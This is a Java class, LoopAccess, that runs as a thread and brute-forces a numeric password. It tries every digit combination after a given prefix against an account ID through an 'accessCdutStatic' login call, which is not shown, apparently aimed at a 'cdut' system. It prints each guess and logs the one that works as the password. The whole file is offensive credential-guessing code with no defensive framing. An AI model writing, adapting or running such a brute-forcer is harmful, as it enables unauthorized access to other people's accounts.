package net.access.cdut;

public  class LoopAccess implements Runnable
{
	
	private int loadDigits ;
	
	private String prefix;
	
	private String id;
	
	
	public LoopAccess(String id,String prefix,int loadDigits)
	{
		this.loadDigits = loadDigits;
		this.prefix = prefix;
		this.id = id;
	}
	
	@Override
	public void run()
	{
		
		for(int i = 0 ;i < Math.pow(10,loadDigits) && StaticClass.find == false;i++)
		{
			String ps = prefix + StaticClass.intToFullString(i,loadDigits);
			System.out.println(ps);
			if(AccessFunc.accessCdutStatic(id,ps))
			{
				StaticClass.find = true;
				StaticClass.logger.info(ps + "##-------is the password");
			}
		}
	}
	
}
